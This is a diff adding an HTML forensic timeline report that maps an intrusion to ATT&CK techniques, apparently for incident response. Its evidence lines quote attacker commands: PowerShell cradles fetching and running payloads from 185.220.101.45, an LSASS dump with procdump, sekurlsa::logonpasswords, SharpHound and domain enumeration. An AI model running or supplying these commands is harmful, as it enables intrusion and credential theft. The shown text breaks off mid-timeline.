@@ -1,0 +1,924 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Attack Timeline — Case_Triage</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:"Segoe UI",Arial,sans-serif;background:#0d1117;color:#c9d1d9;font-size:13px}
+header{background:#161b22;padding:20px 28px;border-bottom:3px solid #c0392b}
+header h1{font-size:20px;color:#f85149}
+header .meta{color:#8b949e;font-size:11.5px;margin-top:6px;line-height:1.8}
+nav{background:#0d1117;padding:10px 28px;display:flex;gap:12px;flex-wrap:wrap;
+     border-bottom:1px solid #21262d;position:sticky;top:0;z-index:99}
+nav a{color:#58a6ff;text-decoration:none;font-size:11px;white-space:nowrap}
+nav a:hover{color:#fff}
+.badge{display:inline-block;font-size:10.5px;padding:2px 9px;border-radius:10px;
+        color:#fff;margin:2px;font-weight:600}
+.main{display:grid;grid-template-columns:340px 1fr;gap:0;min-height:100vh}
+.timeline-col{background:#0d1117;border-right:1px solid #21262d;padding:20px 16px;
+               position:sticky;top:42px;height:calc(100vh - 42px);overflow-y:auto}
+.timeline-col h3{color:#8b949e;font-size:11px;text-transform:uppercase;
+                  letter-spacing:.08em;margin-bottom:14px}
+.tl-item{display:grid;grid-template-columns:130px 16px 1fr;gap:0 10px;
+           margin-bottom:14px;align-items:start}
+.tl-time{color:#8b949e;font-size:10.5px;padding-top:2px;white-space:nowrap}
+.tl-dot{width:12px;height:12px;border-radius:50%;margin-top:3px;flex-shrink:0}
+.tl-content{}
+.tl-phase{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.06em}
+.tl-tech{font-size:11.5px;font-weight:600;color:#c9d1d9;margin:1px 0}
+.tl-desc{font-size:11px;color:#8b949e;line-height:1.4}
+.tl-evidence{font-size:10.5px;color:#8b949e;margin-top:4px;line-height:1.5}
+.ev-line{padding:1px 0}
+.ev-btn{background:none;border:none;color:#58a6ff;font-size:10px;cursor:pointer;
+         padding:2px 0;margin-top:2px}
+.ev-btn:hover{color:#fff}
+.host-tag{background:#21262d;color:#8b949e;font-size:9.5px;padding:1px 5px;
+           border-radius:3px;margin-left:4px}
+.conf-badge{font-size:9.5px;padding:1px 5px;border-radius:3px;font-weight:700}
+.conf-high{background:#2d1515;color:#f85149;border:1px solid #f85149}
+.conf-medium{background:#2d2008;color:#d29922;border:1px solid #d29922}
+.conf-low{background:#1a2a1a;color:#3fb950;border:1px solid #3fb950}
+.detail-col{padding:24px 28px;overflow-y:auto}
+section{margin-bottom:36px}
+h2{font-size:15px;color:#c9d1d9;margin-bottom:14px;padding-bottom:8px;
+    border-bottom:1px solid #21262d}
+.finding{background:#161b22;border-radius:6px;padding:14px 16px;margin-bottom:10px;
+          border-left:3px solid #21262d}
+.f-time{color:#8b949e;font-size:10.5px;margin-bottom:4px}
+.f-tech{font-size:13px;font-weight:600;color:#c9d1d9;margin-bottom:5px}
+.f-desc{font-size:12px;color:#8b949e;line-height:1.5;margin-bottom:6px}
+.f-evidence{margin-left:16px;font-size:11.5px;color:#8b949e;line-height:1.6}
+</style>
+<script>
+function toggleEv(id,btn){
+  const el=document.getElementById(id);
+  const vis=el.style.display!=='none';
+  el.style.display=vis?'none':'block';
+  btn.textContent=vis?'show evidence ▾':'hide evidence ▴';
+}
+</script>
+</head>
+<body>
+<header>
+  <h1>Attack Pattern Analysis &amp; Timeline</h1>
+  <div class="meta">
+    Source: Case_Triage &nbsp;|&nbsp;
+    Incident window: 2024-03-15 16:47:45 → 2024-03-15 18:02:44 UTC &nbsp;|&nbsp;
+    37 indicators across 10 phases &nbsp;|&nbsp;
+    Generated: 2026-03-18 17:14:35 UTC
+    <br><span class="badge" style="background:#c0392b">Initial Access (1)</span> <span class="badge" style="background:#e67e22">Execution (12)</span> <span class="badge" style="background:#8e44ad">Persistence (3)</span> <span class="badge" style="background:#7f8c8d">Defense Evasion (1)</span> <span class="badge" style="background:#2980b9">Credential Access (4)</span> <span class="badge" style="background:#27ae60">Discovery (5)</span> <span class="badge" style="background:#f39c12">Lateral Movement (5)</span> <span class="badge" style="background:#16a085">Collection (1)</span> <span class="badge" style="background:#c0392b">Exfiltration (3)</span> <span class="badge" style="background:#2c3e50">Command and Control (2)</span> 
+  </div>
+</header>
+<nav>
+  <a href="#timeline">Timeline</a>
+  <a href="#Initial_Access">Initial Access</a><a href="#Execution">Execution</a><a href="#Persistence">Persistence</a><a href="#Defense_Evasion">Defense Evasion</a><a href="#Credential_Access">Credential Access</a><a href="#Discovery">Discovery</a><a href="#Lateral_Movement">Lateral Movement</a><a href="#Collection">Collection</a><a href="#Exfiltration">Exfiltration</a><a href="#Command_and_Control">Command and Control</a>
+</nav>
+<div class="main">
+  <div class="timeline-col" id="timeline">
+    <h3>Chronological Timeline</h3>
+    
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 16:47:45</div>
+  <div class="tl-dot" style="background:#c0392b"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#c0392b">Initial Access</div>
+    <div class="tl-tech">T1566.001 — Phishing: Malicious Attachment <span class="host-tag">DESKTOP-W7K2MNX</span>
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">Office application spawned a shell process — macro execution likely.</div>
+    <div class="tl-evidence" id="ev-3568845396392299835" style="display:none"><div class="ev-line">→ Parent: c:\program files\microsoft office\root\office16\winword.exe</div><div class="ev-line">→ Child:  c:\windows\system32\cmd.exe</div><div class="ev-line">→ Cmd:    cmd.exe /c powershell.exe -nop -w hidden -encodedcommand base64encoded</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-3568845396392299835',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 16:47:52</div>
+  <div class="tl-dot" style="background:#e67e22"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#e67e22">Execution</div>
+    <div class="tl-tech">T1059.001 — PowerShell <span class="host-tag">DESKTOP-W7K2MNX</span>
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">Suspicious PowerShell execution with flags: EncodedCommand, NoProfile, WindowHidden.</div>
+    <div class="tl-evidence" id="ev-7363819463014967912" style="display:none"><div class="ev-line">→ Cmd: powershell.exe -nop -w hidden -encodedcommand base64encoded</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-7363819463014967912',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 16:47:55</div>
+  <div class="tl-dot" style="background:#e67e22"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#e67e22">Execution</div>
+    <div class="tl-tech">T1059.001 — PowerShell Download Cradle <span class="host-tag">DESKTOP-W7K2MNX</span>
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">PowerShell script block contains download cradle.</div>
+    <div class="tl-evidence" id="ev-2971918373688083426" style="display:none"><div class="ev-line">→ Block: iex (new-object net.webclient).downloadstring("http://185.220.101.45/stager.ps1")</div><div class="ev-line">→ URL: http://185.220.101.45/stager.ps1</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-2971918373688083426',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 16:47:58</div>
+  <div class="tl-dot" style="background:#c0392b"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#c0392b">Exfiltration</div>
+    <div class="tl-tech">T1048 — Exfiltration Over Alternative Protocol 
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">60.0 MB sent to 185.220.101.45 via rclone.exe across 15 connections.</div>
+    <div class="tl-evidence" id="ev-731167681966796893" style="display:none"><div class="ev-line">→ Destination: 185.220.101.45</div><div class="ev-line">→ Total sent:  60.0 MB</div><div class="ev-line">→ Connections: 15</div><div class="ev-line">→ Process:     C:\Users\jsmith\AppData\Local\Temp\rclone.exe</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-731167681966796893',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 16:48:02</div>
+  <div class="tl-dot" style="background:#e67e22"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#e67e22">Execution</div>
+    <div class="tl-tech">T1059.001 — PowerShell Download Cradle <span class="host-tag">DESKTOP-W7K2MNX</span>
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">PowerShell script block contains download cradle.</div>
+    <div class="tl-evidence" id="ev-3658790274490720887" style="display:none"><div class="ev-line">→ Block: $url="http://185.220.101.45/payload.exe"; $out="$env:temp\svchost32.exe"; (new-object net.webclient).downloadfile($url,$out); start-process $out -argumentlist "-install"</div><div class="ev-line">→ URL: http://185.220.101.45/payload.exe</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-3658790274490720887',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 16:48:15</div>
+  <div class="tl-dot" style="background:#8e44ad"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#8e44ad">Persistence</div>
+    <div class="tl-tech">T1543.003 — New Windows Service <span class="host-tag">DESKTOP-W7K2MNX</span>
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">New service installed: winupdatehelper.</div>
+    <div class="tl-evidence" id="ev-2619800558171323385" style="display:none"><div class="ev-line">→ Service: winupdatehelper</div><div class="ev-line">→ Binary:  c:\users\jsmith\appdata\local\temp\svchost32.exe -service</div><div class="ev-line">→ Start:   auto start</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-2619800558171323385',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 16:48:30</div>
+  <div class="tl-dot" style="background:#2c3e50"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#2c3e50">Command and Control</div>
+    <div class="tl-tech">T1071 — Application Layer C2 Beaconing 
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">Regular outbound connections from svchost32.exe to 185.220.101.45:443 suggest C2 beaconing (avg interval: 300s, 8 connections).</div>
+    <div class="tl-evidence" id="ev-9126982285665648967" style="display:none"><div class="ev-line">→ Process:  C:\Users\jsmith\AppData\Local\Temp\svchost32.exe</div><div class="ev-line">→ Dest:     185.220.101.45:443</div><div class="ev-line">→ Count:    8 connections</div><div class="ev-line">→ Interval: ~300s (σ=0.0s)</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-9126982285665648967',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 16:52:04</div>
+  <div class="tl-dot" style="background:#e67e22"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#e67e22">Execution</div>
+    <div class="tl-tech">T1106 — Native API / Malware Process Chain <span class="host-tag">DESKTOP-W7K2MNX</span>
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">Suspicious parent process spawned child.</div>
+    <div class="tl-evidence" id="ev-8303673157330276992" style="display:none"><div class="ev-line">→ Parent: c:\users\jsmith\appdata\local\temp\svchost32.exe</div><div class="ev-line">→ Child:  c:\users\jsmith\appdata\local\temp\pd.exe</div><div class="ev-line">→ Cmd:    pd.exe -accepteula -ma lsass.exe c:\users\jsmith\appdata\local\temp\lsass.dmp</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-8303673157330276992',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 16:52:04</div>
+  <div class="tl-dot" style="background:#2980b9"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#2980b9">Credential Access</div>
+    <div class="tl-tech">T1003 — OS Credential Dumping <span class="host-tag">DESKTOP-W7K2MNX</span>
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">Known credential tool executed: Procdump — LSASS dump utility.</div>
+    <div class="tl-evidence" id="ev-1493340305761616229" style="display:none"><div class="ev-line">→ Process: c:\users\jsmith\appdata\local\temp\pd.exe</div><div class="ev-line">→ Cmd: pd.exe -accepteula -ma lsass.exe c:\users\jsmith\appdata\local\temp\lsass.dmp</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-1493340305761616229',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 16:52:30</div>
+  <div class="tl-dot" style="background:#2980b9"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#2980b9">Credential Access</div>
+    <div class="tl-tech">T1003.001 — LSASS Memory <span class="host-tag">DESKTOP-W7K2MNX</span>
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">Handle requested to LSASS process — memory dump likely.</div>
+    <div class="tl-evidence" id="ev-5228670037053250582" style="display:none"><div class="ev-line">→ Accessing process: c:\users\jsmith\appdata\local\temp\pd.exe</div><div class="ev-line">→ Access mask: 0x1410</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-5228670037053250582',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 16:55:00</div>
+  <div class="tl-dot" style="background:#e67e22"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#e67e22">Execution</div>
+    <div class="tl-tech">T1106 — Native API / Malware Process Chain <span class="host-tag">DESKTOP-W7K2MNX</span>
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">Suspicious parent process spawned child.</div>
+    <div class="tl-evidence" id="ev-4451505731437957758" style="display:none"><div class="ev-line">→ Parent: c:\users\jsmith\appdata\local\temp\svchost32.exe</div><div class="ev-line">→ Child:  c:\windows\system32\net.exe</div><div class="ev-line">→ Cmd:    net.exe group "domain admins" /domain</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-4451505731437957758',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 16:55:00</div>
+  <div class="tl-dot" style="background:#27ae60"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#27ae60">Discovery</div>
+    <div class="tl-tech">T1069/T1087 — Account/Group Discovery <span class="host-tag">DESKTOP-W7K2MNX</span>
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">Domain group/user enumeration via net.exe</div>
+    <div class="tl-evidence" id="ev-1698977242015454540" style="display:none"><div class="ev-line">→ Cmd: net.exe group "domain admins" /domain</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-1698977242015454540',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 16:55:08</div>
+  <div class="tl-dot" style="background:#e67e22"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#e67e22">Execution</div>
+    <div class="tl-tech">T1106 — Native API / Malware Process Chain <span class="host-tag">DESKTOP-W7K2MNX</span>
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">Suspicious parent process spawned child.</div>
+    <div class="tl-evidence" id="ev-991464511302131209" style="display:none"><div class="ev-line">→ Parent: c:\users\jsmith\appdata\local\temp\svchost32.exe</div><div class="ev-line">→ Child:  c:\windows\system32\net.exe</div><div class="ev-line">→ Cmd:    net.exe user /domain</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-991464511302131209',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 16:55:08</div>
+  <div class="tl-dot" style="background:#27ae60"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#27ae60">Discovery</div>
+    <div class="tl-tech">T1069/T1087 — Account/Group Discovery <span class="host-tag">DESKTOP-W7K2MNX</span>
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">Domain group/user enumeration via net.exe</div>
+    <div class="tl-evidence" id="ev-5861310135631742666" style="display:none"><div class="ev-line">→ Cmd: net.exe user /domain</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-5861310135631742666',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 16:55:18</div>
+  <div class="tl-dot" style="background:#e67e22"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#e67e22">Execution</div>
+    <div class="tl-tech">T1106 — Native API / Malware Process Chain <span class="host-tag">DESKTOP-W7K2MNX</span>
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">Suspicious parent process spawned child.</div>
+    <div class="tl-evidence" id="ev-9173392456341663774" style="display:none"><div class="ev-line">→ Parent: c:\users\jsmith\appdata\local\temp\svchost32.exe</div><div class="ev-line">→ Child:  c:\windows\system32\nltest.exe</div><div class="ev-line">→ Cmd:    nltest.exe /domain_trusts /all_trusts</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-9173392456341663774',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 16:55:18</div>
+  <div class="tl-dot" style="background:#27ae60"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#27ae60">Discovery</div>
+    <div class="tl-tech">T1069/T1087 — Account/Group Discovery <span class="host-tag">DESKTOP-W7K2MNX</span>
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">Domain trust and DC enumeration via nltest.exe</div>
+    <div class="tl-evidence" id="ev-8526878520010412378" style="display:none"><div class="ev-line">→ Cmd: nltest.exe /domain_trusts /all_trusts</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-8526878520010412378',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 16:55:25</div>
+  <div class="tl-dot" style="background:#e67e22"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#e67e22">Execution</div>
+    <div class="tl-tech">T1106 — Native API / Malware Process Chain <span class="host-tag">DESKTOP-W7K2MNX</span>
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">Suspicious parent process spawned child.</div>
+    <div class="tl-evidence" id="ev-1867795139481145715" style="display:none"><div class="ev-line">→ Parent: c:\users\jsmith\appdata\local\temp\svchost32.exe</div><div class="ev-line">→ Child:  c:\windows\system32\nltest.exe</div><div class="ev-line">→ Cmd:    nltest.exe /dclist:acme.local</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-1867795139481145715',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 16:55:25</div>
+  <div class="tl-dot" style="background:#27ae60"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#27ae60">Discovery</div>
+    <div class="tl-tech">T1069/T1087 — Account/Group Discovery <span class="host-tag">DESKTOP-W7K2MNX</span>
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">Domain trust and DC enumeration via nltest.exe</div>
+    <div class="tl-evidence" id="ev-3900472342429960713" style="display:none"><div class="ev-line">→ Cmd: nltest.exe /dclist:acme.local</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-3900472342429960713',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 17:03:05</div>
+  <div class="tl-dot" style="background:#e67e22"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#e67e22">Execution</div>
+    <div class="tl-tech">T1059.001 — PowerShell Download Cradle <span class="host-tag">DESKTOP-W7K2MNX</span>
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">PowerShell script block contains download cradle.</div>
+    <div class="tl-evidence" id="ev-2707778806245412839" style="display:none"><div class="ev-line">→ Block: invoke-expression (new-object net.webclient).downloadstring("http://185.220.101.45/sharphound.ps1"); invoke-bloodhound -collectionmethod all</div><div class="ev-line">→ URL: http://185.220.101.45/sharphound.ps1</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-2707778806245412839',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 17:03:05</div>
+  <div class="tl-dot" style="background:#2980b9"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#2980b9">Credential Access</div>
+    <div class="tl-tech">T1059.001 — Malicious Script Block <span class="host-tag">DESKTOP-W7K2MNX</span>
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">PowerShell script block contains credential harvesting pattern: invoke-bloodhound.</div>
+    <div class="tl-evidence" id="ev-7828053315977336293" style="display:none"><div class="ev-line">→ Block: invoke-expression (new-object net.webclient).downloadstring("http://185.220.101.45/sharphound.ps1"); invoke-bloodhound -collectionmethod all</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-7828053315977336293',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 17:03:12</div>
+  <div class="tl-dot" style="background:#e67e22"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#e67e22">Execution</div>
+    <div class="tl-tech">T1106 — Native API / Malware Process Chain <span class="host-tag">DESKTOP-W7K2MNX</span>
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">Suspicious parent process spawned child.</div>
+    <div class="tl-evidence" id="ev-977242981028145156" style="display:none"><div class="ev-line">→ Parent: c:\users\jsmith\appdata\local\temp\svchost32.exe</div><div class="ev-line">→ Child:  c:\users\jsmith\appdata\local\temp\sharphound.exe</div><div class="ev-line">→ Cmd:    sharphound.exe -c all --domain acme.local --zipfilename bloodhound_acme.zip</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-977242981028145156',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 17:03:12</div>
+  <div class="tl-dot" style="background:#27ae60"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#27ae60">Discovery</div>
+    <div class="tl-tech">T1087/T1482 — BloodHound AD Collection <span class="host-tag">DESKTOP-W7K2MNX</span>
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">BloodHound/SharpHound executed — full AD object collection for attack path analysis.</div>
+    <div class="tl-evidence" id="ev-2623537859163467583" style="display:none"><div class="ev-line">→ Cmd: sharphound.exe -c all --domain acme.local --zipfilename bloodhound_acme.zip</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-2623537859163467583',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 17:15:33</div>
+  <div class="tl-dot" style="background:#f39c12"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#f39c12">Lateral Movement</div>
+    <div class="tl-tech">T1550.002 — Use of Alternate Credentials <span class="host-tag">DESKTOP-W7K2MNX</span>
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">Explicit credential logon to srv-file01 as svc_backup.</div>
+    <div class="tl-evidence" id="ev-2471621021249657677" style="display:none"><div class="ev-line">→ Target user:   svc_backup</div><div class="ev-line">→ Target host:   srv-file01</div><div class="ev-line">→ Process used:  c:\windows\system32\mstsc.exe</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-2471621021249657677',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 17:16:03</div>
+  <div class="tl-dot" style="background:#f39c12"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#f39c12">Lateral Movement</div>
+    <div class="tl-tech">T1021.001 — Remote Desktop Protocol <span class="host-tag">SRV-FILE01</span>
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">RDP session from 10.10.1.55 as acme\svc_backup.</div>
+    <div class="tl-evidence" id="ev-871530571315551894" style="display:none"><div class="ev-line">→ User:    acme\svc_backup</div><div class="ev-line">→ Source:  10.10.1.55</div><div class="ev-line">→ EventID: 1149</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-871530571315551894',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 17:16:05</div>
+  <div class="tl-dot" style="background:#f39c12"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#f39c12">Lateral Movement</div>
+    <div class="tl-tech">T1021.001 — Remote Desktop Protocol <span class="host-tag">SRV-FILE01</span>
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">RDP session from 10.10.1.55 as acme\svc_backup.</div>
+    <div class="tl-evidence" id="ev-1094255517590697636" style="display:none"><div class="ev-line">→ User:    acme\svc_backup</div><div class="ev-line">→ Source:  10.10.1.55</div><div class="ev-line">→ EventID: 21</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-1094255517590697636',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 17:16:07</div>
+  <div class="tl-dot" style="background:#f39c12"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#f39c12">Lateral Movement</div>
+    <div class="tl-tech">T1021.001 — Remote Desktop Protocol <span class="host-tag">SRV-FILE01</span>
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">RDP session from 10.10.1.55 as acme\svc_backup.</div>
+    <div class="tl-evidence" id="ev-974974365339347132" style="display:none"><div class="ev-line">→ User:    acme\svc_backup</div><div class="ev-line">→ Source:  10.10.1.55</div><div class="ev-line">→ EventID: 22</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-974974365339347132',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 17:20:11</div>
+  <div class="tl-dot" style="background:#2980b9"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#2980b9">Credential Access</div>
+    <div class="tl-tech">T1059.001 — Malicious Script Block <span class="host-tag">DESKTOP-W7K2MNX</span>
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">PowerShell script block contains credential harvesting pattern: sekurlsa.</div>
+    <div class="tl-evidence" id="ev-5311871124003381503" style="display:none"><div class="ev-line">→ Block: sekurlsa::logonpasswords</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-5311871124003381503',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 17:22:05</div>
+  <div class="tl-dot" style="background:#8e44ad"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#8e44ad">Persistence</div>
+    <div class="tl-tech">T1053.005 — Scheduled Task <span class="host-tag">DESKTOP-W7K2MNX</span>
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">Scheduled task created: \microsoft\windows\updatecheck\winupdatesvc.</div>
+    <div class="tl-evidence" id="ev-3616971442960454402" style="display:none"><div class="ev-line">→ Task: \microsoft\windows\updatecheck\winupdatesvc</div><div class="ev-line">→ Action path hint: suspicious user path</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-3616971442960454402',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-medium">
+  <div class="tl-time">2024-03-15 17:22:05</div>
+  <div class="tl-dot" style="background:#8e44ad"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#8e44ad">Persistence</div>
+    <div class="tl-tech">T1053.005 — Scheduled Task Registered <span class="host-tag">DESKTOP-W7K2MNX</span>
+      <span class="conf-badge conf-medium">MEDIUM</span>
+    </div>
+    <div class="tl-desc">Scheduled task registered: \microsoft\windows\updatecheck\winupdatesvc.</div>
+    <div class="tl-evidence" id="ev-3820667087261228147" style="display:none"><div class="ev-line">→ Task: \microsoft\windows\updatecheck\winupdatesvc</div><div class="ev-line">→ User: acme\jsmith</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-3820667087261228147',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 17:35:18</div>
+  <div class="tl-dot" style="background:#e67e22"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#e67e22">Execution</div>
+    <div class="tl-tech">T1106 — Native API / Malware Process Chain <span class="host-tag">DESKTOP-W7K2MNX</span>
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">Suspicious parent process spawned child.</div>
+    <div class="tl-evidence" id="ev-4984196078755827080" style="display:none"><div class="ev-line">→ Parent: c:\users\jsmith\appdata\local\temp\svchost32.exe</div><div class="ev-line">→ Child:  c:\windows\system32\robocopy.exe</div><div class="ev-line">→ Cmd:    robocopy.exe \\srv-file01\finance c:\users\jsmith\appdata\local\temp\staging /e /copyall</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-4984196078755827080',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 17:35:18</div>
+  <div class="tl-dot" style="background:#16a085"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#16a085">Collection</div>
+    <div class="tl-tech">T1074 — Robocopy used for bulk file staging <span class="host-tag">DESKTOP-W7K2MNX</span>
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">File staging tool robocopy.exe executed.</div>
